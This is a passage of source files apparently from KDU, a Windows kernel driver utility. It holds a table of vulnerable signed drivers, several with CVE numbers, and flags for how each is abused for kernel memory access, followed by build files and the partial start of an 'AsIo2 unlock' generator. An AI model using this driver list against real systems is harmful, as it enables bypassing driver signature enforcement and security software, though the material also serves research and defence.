        KDU_PROVIDER_INPOUTX64,
        KDU_VICTIM_DEFAULT,
        SourceBaseWinIo,
        KDUPROV_FLAGS_PML4_FROM_LOWSTUB,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"inpoutx64 Driver Version 1.2",
        (LPWSTR)L"inpoutx64",
        (LPWSTR)L"inpoutx64",
        (LPWSTR)L"Red Fox UK Limited"
     },

     {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_PASSMARK_OSF,
        KDU_PROVIDER_PASSMARK_OSF,
        KDU_VICTIM_DEFAULT,
        SourceBaseNone,
        KDUPROV_FLAGS_SIGNATURE_WHQL | KDUPROV_FLAGS_PML4_FROM_LOWSTUB,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"PassMark OSForensics DirectIO",
        (LPWSTR)L"DirectIo64",
        (LPWSTR)L"DIRECTIO64",
        (LPWSTR)L"PassMark Software Pty Ltd"
     },

     {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_ASROCKDRV,
        KDU_PROVIDER_ASROCK,
        KDU_VICTIM_DEFAULT,
        SourceBaseRWEverything,
        KDUPROV_FLAGS_SIGNATURE_WHQL | KDUPROV_FLAGS_PHYSICAL_BRUTE_FORCE,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"ASRock IO Driver",
        (LPWSTR)L"AsrDrv106",
        (LPWSTR)L"AsrDrv106",
        (LPWSTR)L"ASROCK Incorporation"
     },

     {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_ALSYSIO64,
        KDU_PROVIDER_ALCPU,
        KDU_VICTIM_DEFAULT,
        SourceBaseNone,
        KDUPROV_FLAGS_SIGNATURE_WHQL | KDUPROV_FLAGS_PHYSICAL_BRUTE_FORCE,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"Core Temp",
        (LPWSTR)L"ALSysIO64",
        (LPWSTR)L"ALSysIO",
        (LPWSTR)L"ALCPU (Arthur Liberman)"
     },

     {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_AMD_RYZENMASTER,
        KDU_PROVIDER_AMD_RYZENMASTER,
        KDU_VICTIM_DEFAULT,
        SourceBaseNone,
        KDUPROV_FLAGS_SIGNATURE_WHQL | KDUPROV_FLAGS_PHYSICAL_BRUTE_FORCE,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"AMD Ryzen Master Service Driver",
        (LPWSTR)L"AMDRyzenMasterDriver",
        (LPWSTR)L"AMDRyzenMasterDriverV20",
        (LPWSTR)L"Advanced Micro Devices Inc."
     },

     {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_PHYSMEM,
        KDU_PROVIDER_HR_PHYSMEM,
        KDU_VICTIM_DEFAULT,
        SourceBaseNone,
        KDUPROV_FLAGS_NO_FORCED_SD | KDUPROV_FLAGS_PHYSICAL_BRUTE_FORCE,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"Physical Memory Access Driver",
        (LPWSTR)L"physmem",
        (LPWSTR)L"PHYSMEMVIEWER",
        (LPWSTR)L"Hilscher Gesellschaft fuer Systemautomation mbH"
     },

     {
        NT_WIN10_REDSTONE4,
        KDU_MAX_NTBUILDNUMBER,
        IDR_LDD,
        KDU_PROVIDER_LENOVO_DD,
        KDU_VICTIM_DEFAULT,
        SourceBaseNone,
        KDUPROV_FLAGS_SIGNATURE_WHQL | KDUPROV_FLAGS_PREFER_PHYSICAL | KDUPROV_FLAGS_USE_SYMBOLS,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"Lenovo Diagnostics Driver for Windows 10 and later (CVE-2022-3699)",
        (LPWSTR)L"LenovoDiagnosticsDriver",
        (LPWSTR)L"LenovoDiagnosticsDriver",
        (LPWSTR)L"Lenovo"
     },

     {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_PCDSRVC,
        KDU_PROVIDER_DELL_PCDOC,
        KDU_VICTIM_DEFAULT,
        SourceBaseNone,
        KDUPROV_FLAGS_PHYSICAL_BRUTE_FORCE,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"PC-Doctor (CVE-2019-12280)",
        (LPWSTR)L"pcdsrvc_x64",
        (LPWSTR)L"pcdsrvc_x64",
        (LPWSTR)L"PC-Doctor, Inc."
     },

     {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_MSI_WINIO,
        KDU_PROVIDER_MSI_WINIO,
        KDU_VICTIM_DEFAULT,
        SourceBaseWinIo,
        KDUPROV_FLAGS_SIGNATURE_WHQL | KDUPROV_FLAGS_PML4_FROM_LOWSTUB,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"MSI Foundation Service",
        (LPWSTR)L"WinIo",
        (LPWSTR)L"WinIo",
        (LPWSTR)L"Microsoft Windows Hardware Compatibility Publisher"
     },

     {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_HP_ETDSUPP,
        KDU_PROVIDER_HP_ETDSUPPORT,
        KDU_VICTIM_DEFAULT,
        SourceBaseNone,
        KDUPROV_FLAGS_SIGNATURE_WHQL | KDUPROV_FLAGS_PREFER_VIRTUAL,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"ETDi Support Driver",
        (LPWSTR)L"EtdSupport",
        (LPWSTR)L"EtdSupport_18.0",
        (LPWSTR)L"HP Inc."
     },

     {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_KEXPLORE,
        KDU_PROVIDER_KEXPLORE,
        KDU_VICTIM_DEFAULT,
        SourceBaseNone,
        KDUPROV_FLAGS_PREFER_VIRTUAL,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"Kernel Explorer Driver",
        (LPWSTR)L"KExplore",
        (LPWSTR)L"KExplore",
        (LPWSTR)L"Pavel Yosifovich"
     },

    {
        KDU_MIN_NTBUILDNUMBER,
        NT_WIN10_22H2,
        IDR_KOBJEXP,
        KDU_PROVIDER_KOBJEXP,
        KDU_VICTIM_PE1702,
        SourceBaseNone,
        KDUPROV_FLAGS_NO_FORCED_SD | KDUPROV_FLAGS_PML4_FROM_LOWSTUB | KDUPROV_FLAGS_PREFER_PHYSICAL,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"Kernel Object Explorer Driver",
        (LPWSTR)L"KObjExp",
        (LPWSTR)L"KObjExp",
        (LPWSTR)L"Pavel Yosifovich"
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        NT_WIN10_22H2,
        IDR_KREGEXP,
        KDU_PROVIDER_KREGEXP,
        KDU_VICTIM_PE1702,
        SourceBaseNone,
        KDUPROV_FLAGS_NO_FORCED_SD | KDUPROV_FLAGS_PML4_FROM_LOWSTUB | KDUPROV_FLAGS_PREFER_PHYSICAL,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"Kernel Registry Explorer Driver",
        (LPWSTR)L"KRegExp",
        (LPWSTR)L"KRegExp",
        (LPWSTR)L"Pavel Yosifovich"
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_ECHODRV,
        KDU_PROVIDER_ECHODRV,
        KDU_VICTIM_PE1702,
        SourceBaseNone,
        KDUPROV_FLAGS_SIGNATURE_WHQL | KDUPROV_FLAGS_PREFER_VIRTUAL | KDUPROV_FLAGS_OPENPROCESS_SUPPORTED,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"Echo AntiCheat",
        (LPWSTR)L"EchoDrv",
        (LPWSTR)L"EchoDrv",
        (LPWSTR)L"Microsoft Windows Hardware Compatibility Publisher"
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_NVOCLOCK,
        KDU_PROVIDER_NVOCLOCK,
        KDU_VICTIM_PE1702,
        SourceBaseNone,
        KDUPROV_FLAGS_PHYSICAL_BRUTE_FORCE,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"NVidia System Utility Driver",
        (LPWSTR)L"nvoclock",
        (LPWSTR)L"NVR0Internal",
        (LPWSTR)L"NVIDIA Corporation"
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_IREC,
        KDU_PROVIDER_BINALYZE_IREC,
        KDU_VICTIM_DEFAULT,
        SourceBaseNone,
        KDUPROV_FLAGS_SIGNATURE_WHQL | KDUPROV_FLAGS_NO_VICTIM | KDUPROV_FLAGS_OPENPROCESS_SUPPORTED,
        KDUPROV_SC_NONE,
        (LPWSTR)L"Binalyze CVE-2023-41444",
        (LPWSTR)L"IREC",
        (LPWSTR)L"IREC",
        (LPWSTR)L"Microsoft Windows Hardware Compatibility Publisher"
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_PHYDMACC,
        KDU_PROVIDER_PHYDMACC,
        KDU_VICTIM_PE1702,
        SourceBaseWinRing0,
        KDUPROV_FLAGS_PHYSICAL_BRUTE_FORCE,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"SLIC ToolKit",
        (LPWSTR)L"PhyDMACC",
        (LPWSTR)L"PhyDMACC_1_2_0",
        (LPWSTR)L"Suzhou Ind. Park ShiSuanKeJi Co., Ltd."
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_RZPNK,
        KDU_PROVIDER_RAZER,
        KDU_VICTIM_DEFAULT,
        SourceBaseNone,
        KDUPROV_FLAGS_NO_VICTIM | KDUPROV_FLAGS_OPENPROCESS_SUPPORTED,
        KDUPROV_SC_NONE,
        (LPWSTR)L"Razer Overlay Support driver CVE-2017-9769",
        (LPWSTR)L"rzpnk",
        (LPWSTR)L"47CD78C9-64C3-47C2-B80F-677B887CF095",
        (LPWSTR)L"Razer USA Ltd."
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_AMD_PDFWKRNL,
        KDU_PROVIDER_AMD_PDFWKRNL,
        KDU_VICTIM_DEFAULT,
        SourceBaseNone,
        KDUPROV_FLAGS_SIGNATURE_WHQL | KDUPROV_FLAGS_PREFER_VIRTUAL,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"AMD USB-C Power Delivery Firmware Update Utility CVE-2023-20598",
        (LPWSTR)L"PdFwKrnl",
        (LPWSTR)L"PdFwKrnl",
        (LPWSTR)L"Advanced Micro Devices Inc."
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_AMD_AOD215,
        KDU_PROVIDER_AMD_AOD215,
        KDU_VICTIM_DEFAULT,
        SourceBaseNone,
        KDUPROV_FLAGS_PHYSICAL_BRUTE_FORCE,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"AMD OverDrive Driver (same as CVE-2020-12928)",
        (LPWSTR)L"AODDriver",
        (LPWSTR)L"AODDriver",
        (LPWSTR)L"Advanced Micro Devices Inc."
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_WNBIOS64,
        KDU_PROVIDER_WINCOR,
        KDU_VICTIM_DEFAULT,
        SourceBaseWinIo,
        KDUPROV_FLAGS_SIGNATURE_WHQL | KDUPROV_FLAGS_PML4_FROM_LOWSTUB,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"WnBios Driver",
        (LPWSTR)L"wnBios64",
        (LPWSTR)L"WNBIOS",
        (LPWSTR)L"Wincor Nixdorf International GmbH"
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_EVGA_ELEETX1,
        KDU_PROVIDER_EVGA_ELEETX1,
        KDU_VICTIM_DEFAULT,
        SourceBaseNone,
        KDUPROV_FLAGS_SIGNATURE_WHQL | KDUPROV_FLAGS_PHYSICAL_BRUTE_FORCE,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"EVGA Low Level Driver",
        (LPWSTR)L"EleetX1",
        (LPWSTR)L"EleetX1",
        (LPWSTR)L"EVGA Corp."
    },

     {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_ASROCKDRV2,
        KDU_PROVIDER_ASROCK2,
        KDU_VICTIM_DEFAULT,
        SourceBaseRWEverything,
        KDUPROV_FLAGS_PHYSICAL_BRUTE_FORCE,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"RW-Everything Read & Write Driver",
        (LPWSTR)L"AxtuDrv",
        (LPWSTR)L"AxtuDrv",
        (LPWSTR)L"ASROCK Incorporation"
     },

     {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_ASROCKAPPSHOP103,
        KDU_PROVIDER_ASROCK3,
        KDU_VICTIM_DEFAULT,
        SourceBaseRWEverything,
        KDUPROV_FLAGS_PHYSICAL_BRUTE_FORCE,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"AppShopDrv103 Driver",
        (LPWSTR)L"AppShopDrv103",
        (LPWSTR)L"AppShopDrv103",
        (LPWSTR)L"ASROCK Incorporation"
     },

     {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_ASROCKDRV3,
        KDU_PROVIDER_ASROCK4,
        KDU_VICTIM_DEFAULT,
        SourceBaseRWEverything,
        KDUPROV_FLAGS_SIGNATURE_WHQL | KDUPROV_FLAGS_PHYSICAL_BRUTE_FORCE,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"ASRock IO Driver",
        (LPWSTR)L"AsrDrv107n",
        (LPWSTR)L"AsrDrv107n",
        (LPWSTR)L"ASROCK INC."
     },

     {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_ASROCKDRV4,
        KDU_PROVIDER_ASROCK5,
        KDU_VICTIM_DEFAULT,
        SourceBaseRWEverything,
        KDUPROV_FLAGS_SIGNATURE_WHQL | KDUPROV_FLAGS_PHYSICAL_BRUTE_FORCE,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"ASRock IO Driver",
        (LPWSTR)L"AsrDrv107",
        (LPWSTR)L"AsrDrv107",
        (LPWSTR)L"ASROCK INC."
     },

    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_PMXDRV64,
        KDU_PROVIDER_INTEL_PMXDRV,
        KDU_VICTIM_DEFAULT,
        SourceBaseNone,
        KDUPROV_FLAGS_SIGNATURE_WHQL | KDUPROV_FLAGS_PML4_FROM_LOWSTUB,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"Intel(R) Management Engine Tools Driver",
        (LPWSTR)L"PMxDrv",
        (LPWSTR)L"Pmxdrv",
        (LPWSTR)L"Intel(R) Embedded Subsystems and IP Blocks Group"
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_HWRWDRVX64,
        KDU_PROVIDER_HWRWDRVX64,
        KDU_VICTIM_DEFAULT,
        SourceBaseWinRing0,
        KDUPROV_FLAGS_PHYSICAL_BRUTE_FORCE,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"Hardware read & write driver",
        (LPWSTR)L"HwRwDrv.x64",
        (LPWSTR)L"HwRwDrv",
        (LPWSTR)L"Open Source Developer, Jun Liu"
    },

    {
        NT_WIN10_THRESHOLD1,
        KDU_MAX_NTBUILDNUMBER,
        IDR_NEACSAFE64,
        KDU_PROVIDER_NEACSAFE64,
        KDU_VICTIM_DEFAULT,
        SourceBaseNone,
        KDUPROV_FLAGS_SIGNATURE_WHQL | KDUPROV_FLAGS_NO_FORCED_SD | KDUPROV_FLAGS_FS_FILTER,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"NeacSafe64 mini-filter driver (CVE-2025-45737)",
        (LPWSTR)L"NeacSafe64",
        (LPWSTR)L"OWNeacSafePort",
        (LPWSTR)L"Microsoft Windows Hardware Compatibility Publisher"
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_THROTTLESTOP,
        KDU_PROVIDER_TPUP,
        KDU_VICTIM_DEFAULT,
        SourceBaseNone,
        KDUPROV_FLAGS_SIGNATURE_WHQL | KDUPROV_FLAGS_USE_SUPERFETCH,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"TechPowerUp ThrottleStop (CVE-2025-7771)",
        (LPWSTR)L"ThrottleStop",
        (LPWSTR)L"ThrottleStop",
        (LPWSTR)L"TechPowerUp"
    },

    {
        KDU_MIN_NTBUILDNUMBER,
        KDU_MAX_NTBUILDNUMBER,
        IDR_TPWSAV,
        KDU_PROVIDER_TOSHIBA,
        KDU_VICTIM_DEFAULT,
        SourceBaseNone,
        KDUPROV_FLAGS_SIGNATURE_WHQL | KDUPROV_FLAGS_USE_SUPERFETCH,
        KDUPROV_SC_ALL_DEFAULT,
        (LPWSTR)L"Toshiba power saving driver for laptops",
        (LPWSTR)L"TPwSav",
        (LPWSTR)L"EBIoDispatch",
        (LPWSTR)L"Compal Electronics"
    }

};

#if defined(__cplusplus)
extern "C" {
#endif

    KDU_DB gProvTable = {
        RTL_NUMBER_OF(gProvEntry),
        gProvEntry
    };

    KDU_DB_VERSION gVersion = {
        KDU_VERSION_MAJOR,
        KDU_VERSION_MINOR,
        KDU_VERSION_REVISION,
        KDU_VERSION_BUILD
    };

#ifdef __cplusplus
}
#endif

```

`Source/Utils/GenAsIo2Unlock/GenAsIo2Unlock.sln`:

```sln

Microsoft Visual Studio Solution File, Format Version 12.00
# Visual Studio Version 16
VisualStudioVersion = 16.0.31025.218
MinimumVisualStudioVersion = 10.0.40219.1
Project("{8BC9CEB8-8B4A-11D0-8D11-00A0C91BC942}") = "GenAsIo2Unlock", "GenAsIo2Unlock.vcxproj", "{19A7EF82-4431-4167-AAC9-57FA29B1AE21}"
EndProject
Global
	GlobalSection(SolutionConfigurationPlatforms) = preSolution
		Debug|x64 = Debug|x64
		Release|x64 = Release|x64
	EndGlobalSection
	GlobalSection(ProjectConfigurationPlatforms) = postSolution
		{19A7EF82-4431-4167-AAC9-57FA29B1AE21}.Debug|x64.ActiveCfg = Debug|x64
		{19A7EF82-4431-4167-AAC9-57FA29B1AE21}.Debug|x64.Build.0 = Debug|x64
		{19A7EF82-4431-4167-AAC9-57FA29B1AE21}.Release|x64.ActiveCfg = Release|x64
		{19A7EF82-4431-4167-AAC9-57FA29B1AE21}.Release|x64.Build.0 = Release|x64
	EndGlobalSection
	GlobalSection(SolutionProperties) = preSolution
		HideSolutionNode = FALSE
	EndGlobalSection
	GlobalSection(ExtensibilityGlobals) = postSolution
		SolutionGuid = {61964766-0C22-42CC-8170-469C28F6C2D8}
	EndGlobalSection
EndGlobal

```

`Source/Utils/GenAsIo2Unlock/GenAsIo2Unlock.vcxproj`:

```vcxproj
<?xml version="1.0" encoding="utf-8"?>
<Project DefaultTargets="Build" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup Label="ProjectConfigurations">
    <ProjectConfiguration Include="Debug|x64">
      <Configuration>Debug</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
    <ProjectConfiguration Include="Release|x64">
      <Configuration>Release</Configuration>
      <Platform>x64</Platform>
    </ProjectConfiguration>
  </ItemGroup>
  <PropertyGroup Label="Globals">
    <VCProjectVersion>16.0</VCProjectVersion>
    <Keyword>Win32Proj</Keyword>
    <ProjectGuid>{19a7ef82-4431-4167-aac9-57fa29b1ae21}</ProjectGuid>
    <RootNamespace>GenAsusUnlock</RootNamespace>
    <WindowsTargetPlatformVersion>10.0</WindowsTargetPlatformVersion>
    <ProjectName>GenAsIo2Unlock</ProjectName>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.Default.props" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>true</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <CharacterSet>Unicode</CharacterSet>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'" Label="Configuration">
    <ConfigurationType>Application</ConfigurationType>
    <UseDebugLibraries>false</UseDebugLibraries>
    <PlatformToolset>v143</PlatformToolset>
    <WholeProgramOptimization>true</WholeProgramOptimization>
    <CharacterSet>Unicode</CharacterSet>
    <SpectreMitigation>false</SpectreMitigation>
  </PropertyGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.props" />
  <ImportGroup Label="ExtensionSettings">
  </ImportGroup>
  <ImportGroup Label="Shared">
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <ImportGroup Label="PropertySheets" Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <Import Project="$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props" Condition="exists('$(UserRootDir)\Microsoft.Cpp.$(Platform).user.props')" Label="LocalAppDataPlatform" />
  </ImportGroup>
  <PropertyGroup Label="UserMacros" />
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LinkIncremental>true</LinkIncremental>
    <OutDir>.\output\$(Platform)\$(Configuration)\</OutDir>
    <IntDir>.\output\$(Platform)\$(Configuration)\</IntDir>
  </PropertyGroup>
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <LinkIncremental>false</LinkIncremental>
    <OutDir>.\output\$(Platform)\$(Configuration)\</OutDir>
    <IntDir>.\output\$(Platform)\$(Configuration)\</IntDir>
    <RunCodeAnalysis>true</RunCodeAnalysis>
  </PropertyGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <ClCompile>
      <WarningLevel>Level3</WarningLevel>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>_DEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <GenerateDebugInformation>true</GenerateDebugInformation>
    </Link>
  </ItemDefinitionGroup>
  <ItemDefinitionGroup Condition="'$(Configuration)|$(Platform)'=='Release|x64'">
    <ClCompile>
      <WarningLevel>Level4</WarningLevel>
      <FunctionLevelLinking>true</FunctionLevelLinking>
      <IntrinsicFunctions>true</IntrinsicFunctions>
      <SDLCheck>true</SDLCheck>
      <PreprocessorDefinitions>NDEBUG;_CONSOLE;%(PreprocessorDefinitions)</PreprocessorDefinitions>
      <ConformanceMode>true</ConformanceMode>
      <RuntimeLibrary>MultiThreaded</RuntimeLibrary>
      <StringPooling>true</StringPooling>
      <ControlFlowGuard>Guard</ControlFlowGuard>
    </ClCompile>
    <Link>
      <SubSystem>Console</SubSystem>
      <EnableCOMDATFolding>true</EnableCOMDATFolding>
      <OptimizeReferences>true</OptimizeReferences>
      <GenerateDebugInformation>false</GenerateDebugInformation>
      <AdditionalOptions>/NOCOFFGRPINFO %(AdditionalOptions)</AdditionalOptions>
    </Link>
  </ItemDefinitionGroup>
  <ItemGroup>
    <ClCompile Include="..\..\Shared\minirtl\cmdline.c" />
    <ClCompile Include="main.cpp" />
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="..\..\Shared\minirtl\cmdline.h" />
    <ClInclude Include="..\..\Shared\ntos\ntos.h" />
  </ItemGroup>
  <Import Project="$(VCTargetsPath)\Microsoft.Cpp.targets" />
  <ImportGroup Label="ExtensionTargets">
  </ImportGroup>
</Project>
```

`Source/Utils/GenAsIo2Unlock/GenAsIo2Unlock.vcxproj.filters`:

```filters
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <ItemGroup>
    <Filter Include="Source Files">
      <UniqueIdentifier>{4FC737F1-C7A5-4376-A066-2A32D752A2FF}</UniqueIdentifier>
      <Extensions>cpp;c;cc;cxx;c++;cppm;ixx;def;odl;idl;hpj;bat;asm;asmx</Extensions>
    </Filter>
    <Filter Include="Header Files">
      <UniqueIdentifier>{93995380-89BD-4b04-88EB-625FBE52EBFB}</UniqueIdentifier>
      <Extensions>h;hh;hpp;hxx;h++;hm;inl;inc;ipp;xsd</Extensions>
    </Filter>
    <Filter Include="Resource Files">
      <UniqueIdentifier>{67DA6AB6-F800-4c08-8B7A-83BB121AAD01}</UniqueIdentifier>
      <Extensions>rc;ico;cur;bmp;dlg;rc2;rct;bin;rgs;gif;jpg;jpeg;jpe;resx;tiff;tif;png;wav;mfcribbon-ms</Extensions>
    </Filter>
    <Filter Include="minirtl">
      <UniqueIdentifier>{df6b50ba-6a92-4149-873b-67cf23736ddf}</UniqueIdentifier>
    </Filter>
  </ItemGroup>
  <ItemGroup>
    <ClCompile Include="main.cpp">
      <Filter>Source Files</Filter>
    </ClCompile>
    <ClCompile Include="..\..\Shared\minirtl\cmdline.c">
      <Filter>minirtl</Filter>
    </ClCompile>
  </ItemGroup>
  <ItemGroup>
    <ClInclude Include="..\..\Shared\ntos\ntos.h">
      <Filter>Header Files</Filter>
    </ClInclude>
    <ClInclude Include="..\..\Shared\minirtl\cmdline.h">
      <Filter>minirtl</Filter>
    </ClInclude>
  </ItemGroup>
</Project>
```

`Source/Utils/GenAsIo2Unlock/GenAsIo2Unlock.vcxproj.user`:

```user
<?xml version="1.0" encoding="utf-8"?>
<Project ToolsVersion="Current" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <PropertyGroup Condition="'$(Configuration)|$(Platform)'=='Debug|x64'">
    <LocalDebuggerCommandArguments>c:\makeexe\kdu\kdu.exe</LocalDebuggerCommandArguments>
    <DebuggerFlavor>WindowsLocalDebugger</DebuggerFlavor>
  </PropertyGroup>
</Project>
```

`Source/Utils/GenAsIo2Unlock/main.cpp`:

```cpp
/*******************************************************************************
*
*  (C) COPYRIGHT AUTHORS, 2020 - 2021
*
*  TITLE:       MAIN.CPP
*
*  VERSION:     1.00
*
*  DATE:        18 Apr 2021
*
*  AsIo2 "unlock" resource generator and binder.
*
* THIS CODE AND INFORMATION IS PROVIDED "AS IS" WITHOUT WARRANTY OF
* ANY KIND, EITHER EXPRESSED OR IMPLIED, INCLUDING BUT NOT LIMITED
* TO THE IMPLIED WARRANTIES OF MERCHANTABILITY AND/OR FITNESS FOR A
* PARTICULAR PURPOSE.
*
*******************************************************************************/

#include <Windows.h>
#include <strsafe.h>

#ifdef __cplusplus
extern "C" {
#include "../../Shared/ntos/ntos.h"
#include "../../Shared/minirtl/cmdline.h"
}
#endif

/*
* supChkSum
*
* Purpose:
*
* Calculate partial checksum for given buffer.
*
*/
USHORT supChkSum(
    ULONG PartialSum,
    PUSHORT Source,
    ULONG Length
)
{
    while (Length--) {
        PartialSum += *Source++;
        PartialSum = (PartialSum >> 16) + (PartialSum & 0xffff);
    }
    return (USHORT)(((PartialSum >> 16) + PartialSum) & 0xffff);
}

/*
* supCalculateCheckSumForMappedFile
*
* Purpose:
*
* Calculate PE file checksum.
*
*/
DWORD supCalculateCheckSumForMappedFile(
    _In_ PVOID BaseAddress,
    _In_ ULONG FileLength
)
{
    PUSHORT AdjustSum;
    PIMAGE_NT_HEADERS NtHeaders;
    USHORT PartialSum;
    ULONG CheckSum;

    PartialSum = supChkSum(0, (PUSHORT)BaseAddress, (FileLength + 1) >> 1);

    NtHeaders = RtlImageNtHeader(BaseAddress);
    if (NtHeaders != NULL) {
        AdjustSum = (PUSHORT)(&NtHeaders->OptionalHeader.CheckSum);
        PartialSum -= (PartialSum < AdjustSum[0]);
        PartialSum -= AdjustSum[0];
        PartialSum -= (PartialSum < AdjustSum[1]);
        PartialSum -= AdjustSum[1];
    }
    else
    {
        PartialSum = 0;
    }
    CheckSum = (ULONG)PartialSum + FileLength;
    return CheckSum;
}

BOOL UpdateChecksum(
    _In_ LPCSTR lpFileName
)
{
    BOOL    bResult = FALSE;
    HANDLE  hFile = INVALID_HANDLE_VALUE;
    HANDLE  hFileMap = NULL;
    DWORD   FileSize;
    LPVOID  ImageBase = NULL;

    PIMAGE_OPTIONAL_HEADER32    oh32 = NULL;
    PIMAGE_OPTIONAL_HEADER64    oh64 = NULL;

    ULONG NewCheckSum;

    IMAGE_NT_HEADERS* NtHeaders = NULL;

    __try {

        hFile = CreateFileA(lpFileName, GENERIC_READ | GENERIC_WRITE,
            0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);

        if (hFile == INVALID_HANDLE_VALUE) {
            printf_s("[G] Cannot open input file\n");
            __leave;
        }

        FileSize = GetFileSize(hFile, NULL);
        if (FileSize == 0) {
            printf_s("[G] Input file is empty\n");
            __leave;
        }

        hFileMap = CreateFileMapping(hFile, NULL, PAGE_READWRITE, 0, 0, NULL);
        if (hFileMap == NULL) {
            printf_s("[G] CreateFileMapping failed for input file\n");
            __leave;
        }

        ImageBase = MapViewOfFile(hFileMap, FILE_MAP_WRITE, 0, 0, 0);
